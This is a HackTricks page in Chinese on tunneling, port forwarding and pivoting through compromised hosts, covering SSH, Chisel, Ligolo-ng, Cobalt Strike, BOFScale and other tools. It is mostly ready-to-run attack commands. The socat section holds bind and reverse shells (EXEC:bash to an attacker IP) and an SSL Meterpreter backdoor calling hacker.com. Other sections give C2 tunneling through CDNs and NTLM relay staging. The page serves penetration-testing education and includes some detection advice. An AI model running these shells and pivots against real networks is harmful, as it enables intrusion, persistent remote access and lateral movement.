# 隧道与端口转发

{{#include ../banners/hacktricks-training.md}}

## Nmap 提示

> [!WARNING]
> Nmap 的代理支持仅限于 TCP 连接，不会影响 ping、端口扫描或操作系统检测扫描。扫描器位于 SOCKS 代理后方时，**禁用主机发现**（`-Pn`）并使用 **TCP connect scan**（`-sT`）。<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

最后一条命令使用 Evil-WinRM 的 `-u` 和 `-i` 选项指定帐户和 WinRM 主机；其默认 WinRM 端口为 5985。<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH 可以通过其加密通道转发 X11 连接、任意 TCP 端口和 Unix 域套接字。<sup>[[6]](#references)</sup>

SSH 图形连接 (X)

`-Y` 启用受信任的 X11 转发，`-C` 请求对转发的数据进行压缩。<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

在 SSH Server 上打开新端口 --> 其他端口

Remote (`-R`) forwarding 会在 SSH server 上监听并连接到本地端；显式绑定地址决定哪些接口可以访问该监听器。<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

本地端口 --> 已攻陷主机 (SSH) --> 第三台主机:端口

本地（`-L`）转发会在客户端监听，并从 SSH 服务器端连接到目标。<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

本地端口 --> 被攻陷的主机 (SSH) --> 任意位置

动态（`-D`）转发会创建一个本地 SOCKS4/SOCKS5 监听器，其连接从远程端发起。<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### 使用 ProxyJump 进行多跳连接

`-J`/`ProxyJump` 可通过一个或多个以逗号分隔的跳板主机连接到目标。转发选项仍属于最终的 SSH 连接，因此下面的 SOCKS 监听器会连接 `internal-target` 上的目标，而不是第一台堡垒机。这样就无需登录跳板机并在其上启动第二个 SSH 客户端。<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

跳板机的主机专属选项应放在 `~/.ssh/config` 中；为目标主机指定的命令行配置不会自动应用于中间主机。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

这适用于通过 DMZ 从内部主机向你的主机获取 reverse shells：

服务器的 `GatewayPorts` 设置决定远程转发是否可以绑定到 loopback 之外的地址；其默认值为 `no`。<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

此基于 root 的示例会在两台主机上创建隧道设备。服务器必须允许 tun 转发，且所选账户必须有权访问 tun 设备；此处可通过 `PermitRootLogin yes` 使用 `root` 账户。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

在服务器端启用转发

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

在客户端设置一条新路由

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 新增了 strict-KEX 扩展，用于应对 Terrapin 的早期传输完整性攻击。尽可能更新通信双方；对于较旧的实现，请遵循供应商的指导，不要仅凭版本号就假设转发的 channel 受到保护。<sup>[[8]](#references)</sup>

## SSHUTTLE

你可以通过 **ssh** 将所有 **traffic** **tunnel** 到经过某台主机的 **subnetwork**。\
例如，转发所有发往 10.10.10.0/24 的 traffic。

`sshuttle` 可通过 SSH 提供透明代理，并支持选择子网和使用自定义 SSH 命令，如下所示。<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

使用私钥连接

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit 的 `portfwd` 支持本地和远程转发，而其 SOCKS proxy 模块旨在与会话路由或 `autoroute` 配合使用，并且在这些示例中默认监听端口 1080。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

本地端口 --> 已攻陷主机（活动会话）--> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

另一种方法：

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike 的 Beacon 可以通过 Beacon 中继 SOCKS4a/SOCKS5 连接；`rportfwd` 会在已攻陷的主机上绑定端口，而 `rportfwd_local` 会从 Cobalt Strike 客户端发起到目标的连接。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

在 Team Server 上开放一个端口，以便需要通过 Beacon 路由流量的网络接口使用该端口。<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> 在这种情况下，端口是在 Beacon 主机上开放的，而不是在 Team Server 上；流量会发送到 Team Server，然后从那里转发到指定的 host:port。<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

反向转发手册说明了以下行为：<sup>[[14]](#references)</sup>

- Beacon 的反向端口转发旨在**将流量隧道传输到 Team Server，而非在各个机器之间中继**。
- 流量通过 Beacon 的 C2 流量进行**隧道传输**，包括 P2P 链路。
- 高端口通常可以避开特权端口限制，但目标操作系统的策略和现有监听器仍会产生影响。

### rPort2Port local

> [!WARNING]
> 在这种情况下，**端口是在 Beacon 主机上打开的**，而非 Team Server 上；**流量会发送到 Cobalt Strike 客户端**（而非 Team Server），再由客户端转发到指定的 host:port。<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat：无需账户的用户空间 TCP 转发

Tailcat 使用 Tailscale 的 WireGuard/NAT-traversal/DERP 数据平面，但不使用 Tailscale 控制平面。它既不需要 Tailscale 账户或管理员权限，也不会安装主机路由或更改 DNS。与 [Tailscale Serve/Funnel](reverse-shells/expose-local-to-the-internet.md#tailscale-funnel--serve) 或进程内的 [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet) 不同，服务器会通过带外方式共享一个 *tailcat 地址*。客户端使用该地址访问远程节点提供的端口。<sup>[[62]](#references)</sup>

对于远程节点上已在 `4444` 端口监听的 TCP 服务，在该节点上启动 `serve`，并将其打印出的地址传给客户端上的 `forward`。第二条命令默认绑定到 `127.0.0.1:18080`，因此仅支持普通 TCP 套接字的本地进程可以连接该 loopback 端口，同时 Tailcat 会将其流量传送到远程端口 `4444`。<sup>[[62]](#references)</sup> 这些端口号并非 Tailcat 专用。<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

地址中包含服务器的 WireGuard 公钥，并且在当前版本中默认还包含预共享密钥。请将其视为凭据：不受限制的服务器会接受任何知道该地址的 peer。临时地址会在服务器退出后失效。保存的 `default` key 会让普通 `serve` 在后续运行中重复使用稳定地址，因此请检查启动消息；如果地址可能暴露，请使用 `serve --allow` 限制客户端。<sup>[[62]](#references)</sup>

连接可以使用直连 UDP 路径，也可以通过 DERP relay。这样无需专用 C2 域名，但不会让网络活动消失。<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - CDN 前置的进程内 tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) 可在 Windows C2 implant 内运行经过修改的 Tailscale overlay，无需安装 TUN driver 或 service。它由三个组件构成：异步 CGo `c-shared` `tailscaled` BOF-PE、一个与本地 API 通信的小型 C++ BOF-PE，以及一个异步 `socksportfwd` TCP-to-SOCKS5 bridge。<sup>[[53]](#references)[[54]](#references)</sup>

### 兼容 CDN 的 TS2021 和 DERP

Tailscale 通常使用专有 HTTP upgrade 来承载基于 Noise 的 TS2021 control channel 和 DERP relay。BOFScale 保留这些字节流，但通过 RFC 6455 WebSockets 传输，并使用 `Sec-WebSocket-Protocol: ts2021` 或 `derp`，因此由操作员控制的 Headscale/DERP origin 可以部署在仅接受标准 WebSocket upgrade 的 CDN 后面。经过修补的客户端会在 HTTP `500` 后尝试通过 WebSockets 重试 TS2021，在 HTTP `426` 后重试 DERP，并让 DERP WebSocket dialer 遵循主机的 proxy 配置；BOF 会设置 `TS_DEBUG_DERP_WS_CLIENT=1`，跳过已知会失败的首次尝试。<sup>[[53]](#references)[[54]](#references)</sup>

CDN 和 origin proxy 必须为 `/ts2021` 和 `/derp` 保留 WebSocket upgrade，将 `/key` 作为普通 HTTP 转发，并禁用内部读写 timeout，因为 relay session 可能无限期保持打开状态。提供的 Headscale 配置启用 `verify_clients`，仅发布操作员内嵌的 DERP map，并将 `derp.urls` 留空，以防回退到由 Tailscale 运营的 relay。<sup>[[53]](#references)[[54]](#references)</sup>

### 进程内 daemon 和命名管道控制

除非被覆盖，BOF entry point 会使用 `-tun=userspace-networking`、`-state mem:` 和 `-no-logs-no-support` 启动 `tailscaled`，然后创建一个以 UUID 命名的 pipe。它会通过 OS pipe 将 Go stdout/stderr 重定向到 Beacon output API，因此完整的 daemon 和 Go runtime 会常驻内存，但 state 和 logs 不会写入 Tailscale 目录。<sup>[[53]](#references)[[54]](#references)</sup>

轻量级客户端通过该 pipe 重现 Tailscale 的 HTTP/1.0 本地 API。它使用 `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` 打开 pipe，因为 daemon 的 `safesocket` 层会模拟 pipe 客户端；它还会发送 `Tailscale-Cap: 125`，并将本地 API 映射为 `up`、`down`、`status`、路由通告和关闭操作。<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> 在要求 daemon 关闭后，不要卸载手动映射的 Go BOF-PE：runtime 和 garbage collector goroutine 可能仍在被 loader 解除映射的内存中执行。请在牺牲进程中运行 `tailscaled`，并终止该进程以完成清理。<sup>[[54]](#references)</sup>

### 通过 userspace SOCKS5 转发由主机发起的流量

入站 tailnet 连接和通告的子网路由可以在 userspace 网络栈中工作，但受害主机上的普通进程没有通往 overlay 的 OS 路由。因此，`socksportfwd` 会监听面向受害主机的 TCP port，与 daemon 的 `0.0.0.0:1080` listener 协商 SOCKS5 `NO AUTH`，为 tailnet 目标发送 `CONNECT`，并异步双向转发数据。当目标是 MagicDNS 名称时，它会使用 `ATYP_DOMAIN`，让 `tailscaled` 解析该名称，而不将其暴露给 Windows resolver。<sup>[[53]](#references)[[54]](#references)</sup>

下面展示了一个最简操作流程；操作员节点和 implant 都必须使用经过修补的 binaries，因为原版 Tailscale 无法通过这种 CDN 设计进行连接。<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

本地转发可以将表面上的身份验证监听器与 relay 工具分离：诱使一台机器向被攻陷主机绑定的端口进行身份验证，通过 tailnet 将流量转发到 `ntlmrelayx`，再将其 relay 到 AD CS、LDAP、HTTP、SMB 或其他兼容目标。有关特定漏洞阶段，请参阅 [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) 和 [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)；BOFScale 仅负责传输。<sup>[[54]](#references)</sup>

### 检测

应搜寻这些特征的组合，而不是依赖单一的弱指标：通常不使用 Go 的进程中出现 Go runtime、具有宽松 SDDL `D:(A;;GA;;;WD)` 的 UUID pipe、意外出现的 `0.0.0.0:1080` SOCKS 监听器，以及持续时间较长、连接到 CDN 地址的 TLS WebSockets。进行 TLS 检查时，如果拥有该进程的不是经过授权的 `tailscaled` 服务，则应标记 `Sec-WebSocket-Protocol: derp` 或 `ts2021`。该仓库的 `bofscale.yar` 规则提供了针对全部三个 BOF-PE 组件的内存特征签名。<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

该项目提供了 `tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp` 和 `tunnel.php` 等 Web 隧道端点；启动本地代理前，先上传一个受支持的端点。<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

你可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) 的 releases 页面下载。\
Chisel 使用 SSH 保护的连接，通过 HTTP 传输 TCP/UDP 流量；请使用兼容的客户端和服务器版本，并确认所选版本的命令语法。<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### 端口转发

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) 可通过 WebSocket、HTTP/2 或 WebTransport（基于 QUIC 的 HTTP/3）承载静态或动态转发。当前版本支持 TCP、UDP、Unix 套接字、stdio、SOCKS5、HTTP 代理，以及 Linux 透明代理监听器，且支持正向和反向模式。<sup>[[52]](#references)</sup>

### 反向 SOCKS5 pivot

在攻击者机器上运行服务器，并使用 `-R` 让 pivot 主动向外连接。采用这种方向时，SOCKS5 监听器会创建在**服务器**上，而请求的连接则从**客户端/pivot**所在的网络发起。<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

反向静态转发使用相同的方向。例如，以下命令会将 pivot 可访问的 `10.10.10.20:445` 暴露在攻击者 loopback 接口的 `8445` 端口上：<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### 出口与传输细节

- 在客户端添加 `-p http://user:pass@proxy:8080`，即可通过显式 HTTP proxy。对于 `curl` 等客户端，使用 `socks5h://127.0.0.1:1080`（或在应用中启用代理 DNS），这样内部名称会在隧道另一端解析，而不是泄露给本地解析器。<sup>[[52]](#references)</sup>
- `wss://` 表示使用 TLS 保护的 WebSocket。`https://` 客户端会使用 HTTP/2，但反向代理/CDN 的缓冲或 HTTP/1 转换经常会破坏双向流；测试此模式时，请直接暴露 wstunnel server。<sup>[[52]](#references)</sup>
- `wts://` 表示使用 QUIC 的 WebTransport。启动 server 时使用 `--enable-webtransport`（或 `wts://` listen URL），并允许监听端口上的 UDP 流量。此模式无法穿过常规 HTTP `CONNECT` proxy，因为该 proxy 传输的是 TCP。<sup>[[52]](#references)</sup>

> [!WARNING]
> 上游项目警告，不要将其内置的自签名证书视为隐私保护措施。建议使用有效的自定义证书并启用 `--tls-verify-certificate`（或使用 mTLS）；除非确实需要远程访问，否则将 proxy 监听器绑定到 loopback；需要保密时，请隧道传输本身已安全的协议。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng 快速入门文档介绍了在 proxy 上创建 TUN 接口、验证 agent 的证书指纹，以及为隧道网络设置路由。<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent 绑定与监听

Ligolo-ng 可以在 agent 上添加监听器，将流量转发到 proxy 端的地址；其保留的 `240.0.0.0/4` 网段可以通过路由访问 agent 本地服务。<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### 访问 Agent 的本地端口

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot 从受害者端启动反向隧道，并在攻击者的环回地址上暴露 SOCKS4 代理；其 README 还介绍了 NTLM 代理凭据和哈希选项。<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

通过 **NTLM proxy** 进行 Pivot

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat 可组合 `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL` 和 `PROXY` 等地址类型；以下示例组合使用了这些文档中介绍的端点。<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### 通过 socks 的 Port2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### 通过 SSL Socat 使用 Meterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

你可以在受害者的控制台中执行以下命令，替代上一条命令，从而通过 socat 文档中定义的 `PROXY` 地址类型遍历**无需身份验证的代理**。<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat 隧道

**/bin/sh console**

在两端创建证书：Client 和 Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

将本地 SSH 端口（22）连接到攻击者主机的 443 端口】【。

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink 是 PuTTY 的命令行连接工具，提供与 `ssh` 类似的 SSH 转发选项。<sup>[[22]](#references)</sup>

SSH 端口请使用大写 `-P`。`-pw` 为兼容性而保留，但会在进程列表中暴露密码；尽可能优先使用密钥认证或 `-pwfile`。<sup>[[22]](#references)[[23]](#references)</sup>

由于此二进制文件将在受害端执行，且它是 SSH 客户端，因此请开放用于反向连接的 SSH 服务和端口；以下命令使用 `-R` 将本地可访问的端口转发到攻击者的机器。<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

创建或更改持久性 `portproxy` 规则时，请使用具有主机所需权限的上下文。Microsoft 记录了下文使用的 `v4tov4` 添加、显示和删除形式。<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### 通过计划任务部署 `portproxy`

有了管理员凭据后，可以通过远程 Task Scheduler 执行来安装原生转发规则，无需上传专用中继工具。例如，[Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) 可以让 pivot 监听 TCP/443，并将连接中继到内部 SMB 服务。<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

此规则是持久的，因此请使用 `netsh interface portproxy show v4tov4` 枚举规则，并在测试后明确将其删除。请记住，`portproxy` 只提供转发功能；主机防火墙也必须允许监听端口。<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

你需要能够通过 RDP 访问该系统。\
下载：

SocksOverRDP 使用 Remote Desktop Dynamic Virtual Channels，通过现有的 RDP 会话传输 SOCKS5 连接；客户端插件在 `127.0.0.1:1080` 上监听，而服务器组件则在 RDP 目标上运行。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows Remote Desktop Service 功能中的 `Dynamic Virtual Channels`（`DVC`）。DVC 负责**通过 RDP 连接隧道传输数据包**。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

在客户端计算机上按如下方式加载 **`SocksOverRDP-Plugin.dll`**：

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

现在我们可以使用 **`mstsc.exe`** 通过 **RDP** **连接**到**受害者**，并且应该会收到一条**提示**，告知 **SocksOverRDP plugin** 已启用，并将在 **127.0.0.1:1080** 上**监听**。

通过 **RDP** **连接**，然后将 `SocksOverRDP-Server.exe` 二进制文件上传到受害者机器并执行：

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

现在，在你的机器（攻击者）上确认端口 1080 正在侦听：

```
netstat -antb | findstr 1080
```

现在可以使用 [**Proxifier**](https://www.proxifier.com/) 通过该端口代理流量。<sup>[[26]](#references)</sup>

### RDP 虚拟通道排查

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling) 是另一个 RDP 虚拟通道隧道；其默认通道名称为 `rdp2tcp`，但操作人员可以选择其他名称。<sup>[[56]](#references)</sup> 通道的创建和关闭会记录在 `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational` 中，事件 ID 分别为 **132** 和 **148**。排查 `rdp2tcp` 和罕见或随机的通道名称，并将其与预期通道（如 `XPSRD`、`cliprdr` 和 `Microsoft::Windows::RDS::DisplayControl`）进行比较。<sup>[[58]](#references)</sup>

## 通过代理转发 Windows GUI 应用的流量

你可以使用 [**Proxifier**](https://www.proxifier.com/) 让 Windows GUI 应用通过代理访问网络。<sup>[[26]](#references)</sup>\
在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
在 **Profile -> Proxification Rules** 中添加要代理的程序名称，以及要代理连接的目标 IP；Proxifier 规则可以匹配应用程序、目标主机和端口。<sup>[[27]](#references)</sup>

## 通过 NTLM 代理建立隧道

前面提到的工具 **Rpivot** 可以通过使用 NTLM 身份验证的代理进行中继。配置身份验证文件并使用 NTLMv2 方法后，**OpenVPN** 也可以通过此类代理路由流量；这是代理穿越，而不是绕过代理身份验证。<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm 可向上游 NTLM proxies 进行身份验证，开放本地监听端口，并可将本地隧道端口映射到目标服务；之后，客户端即可使用该本地端口。<sup>[[29]](#references)</sup>\
例如，转发端口 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

现在，如果你例如将受害者上的 **SSH** 服务设置为监听端口 443，就可以通过攻击者的端口 2222 连接到它。<sup>[[29]](#references)</sup>\
你也可以使用一个连接到 localhost:443 的 **meterpreter**，同时攻击者监听端口 2222。<sup>[[29]](#references)</sup>

## YARP

YARP（Yet Another Reverse Proxy）是 Microsoft 的 .NET 反向代理工具包。你可以在这里找到它：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS 隧道

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

